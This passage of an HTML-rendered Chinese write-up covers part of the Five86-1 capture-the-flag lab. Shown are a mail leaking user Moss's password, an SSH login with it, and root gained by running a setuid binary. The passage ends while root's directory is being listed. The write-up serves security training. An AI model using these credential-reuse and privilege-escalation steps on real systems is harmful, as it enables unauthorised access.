+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; jen@five86-1&lt;span class="p"&gt;;&lt;/span&gt; Wed, &lt;span class="m"&gt;01&lt;/span&gt; Jan &lt;span class="m"&gt;2020&lt;/span&gt; 03:17:00 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;To: jen@five86-1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Subject: Monday Moss
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MIME-Version: 1.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Type: text/plain&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Transfer-Encoding: 8bit
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Message-Id: &amp;lt;E1imZBc-0001FU-El@five86-1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;From: Roy Trenneman &amp;lt;roy@five86-1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Date: Wed, &lt;span class="m"&gt;01&lt;/span&gt; Jan &lt;span class="m"&gt;2020&lt;/span&gt; 03:17:00 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hi Jen,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;As you know, I&lt;span class="s1"&gt;&amp;#39;ll be on the &amp;#34;customer service&amp;#34; course on Monday due to that incident on Level 4 with the accounts people.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;But anyway, I had to change Moss&amp;#39;&lt;/span&gt;s password earlier today, so when Moss is back on Monday morning, can you &lt;span class="nb"&gt;let&lt;/span&gt; him know that his password is now Fire!Fire!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Moss will understand &lt;span class="o"&gt;(&lt;/span&gt;ha ha ha ha&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Tanks,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Roy
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;用户 Moss 的密码遭到泄露 Fire!Fire!&lt;/p&gt;
+&lt;h2 id="切换到-moss-用户"&gt;切换到 Moss 用户
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;jen@five86-1:/var/mail$ ssh moss@10.10.10.103
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The authenticity of host &lt;span class="s1"&gt;&amp;#39;10.10.10.103 (10.10.10.103)&amp;#39;&lt;/span&gt; can&lt;span class="s1"&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Are you sure you want to continue connecting (yes/no)? yes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.10.103&lt;span class="s1"&gt;&amp;#39; (ECDSA) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;moss@10.10.10.103&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux five86-1 4.19.0-6-amd64 &lt;span class="c1"&gt;#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss@five86-1:~$ 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="提权到root"&gt;提权到root
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss@five86-1:~$ ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 12K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295510&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262150&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;7&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262385&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;9&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295530&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .games
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss@five86-1:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; .games
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss@five86-1:~/.games$ ls -liah
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 28K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295530&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295510&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295532&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;21&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; battlestar -&amp;gt; /usr/games/battlestar
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295540&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;14&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; bcd -&amp;gt; /usr/games/bcd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295533&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;21&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; bombardier -&amp;gt; /usr/games/bombardier
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295534&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; empire -&amp;gt; /usr/games/empire
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295541&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;20&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; freesweep -&amp;gt; /usr/games/freesweep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295539&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;15&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; hunt -&amp;gt; /usr/games/hunt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295535&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;20&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ninvaders -&amp;gt; /usr/games/ninvaders
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;264924&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; nsnake -&amp;gt; /usr/games/nsnake
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295531&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;25&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; pacman4console -&amp;gt; /usr/games/pacman4console
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295536&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; petris -&amp;gt; /usr/games/petris
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295537&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;16&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; snake -&amp;gt; /usr/games/snake
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;266999&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; sudoku -&amp;gt; /usr/games/sudoku
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295551&lt;/span&gt; -rwsr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root 17K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; upyourgame
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295538&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;16&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; worms -&amp;gt; /usr/games/worms
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在moss目录下发现一个.games目录下upyougame文件，运行即可获取root权限&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;moss@five86-1:~/.games$ ./upyourgame 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Would you like to play a game? 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;fuck
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Could you please repeat that? 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;fuck
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nope, you&amp;#39;ll need to enter that again. 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;fuck
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;You entered: No. Is this correct? fuck
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;We appear to have a problem? Do we have a problem? fuck
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Made in Britain.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;随便输入字符均可，不用和我一样都是fuck&lt;/p&gt;
+&lt;h2 id="获取flag"&gt;获取flag
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# ls -liah&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 28K
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295530&lt;/span&gt; drwx------ &lt;span class="m"&gt;2&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295510&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; moss moss 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295532&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;21&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; battlestar -&amp;gt; /usr/games/battlestar
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295540&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;14&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; bcd -&amp;gt; /usr/games/bcd
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295533&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;21&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; bombardier -&amp;gt; /usr/games/bombardier
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295534&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; empire -&amp;gt; /usr/games/empire
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295541&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;20&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; freesweep -&amp;gt; /usr/games/freesweep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295539&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;15&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; hunt -&amp;gt; /usr/games/hunt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295535&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;20&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; ninvaders -&amp;gt; /usr/games/ninvaders
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;264924&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; nsnake -&amp;gt; /usr/games/nsnake
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295531&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;25&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; pacman4console -&amp;gt; /usr/games/pacman4console
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295536&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; petris -&amp;gt; /usr/games/petris
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295537&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;16&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; snake -&amp;gt; /usr/games/snake
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;266999&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;17&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; sudoku -&amp;gt; /usr/games/sudoku
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295551&lt;/span&gt; -rwsr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root 17K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; upyourgame
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295538&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; moss moss &lt;span class="m"&gt;16&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; worms -&amp;gt; /usr/games/worms
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cd /root&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# ls -liah&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total 24K
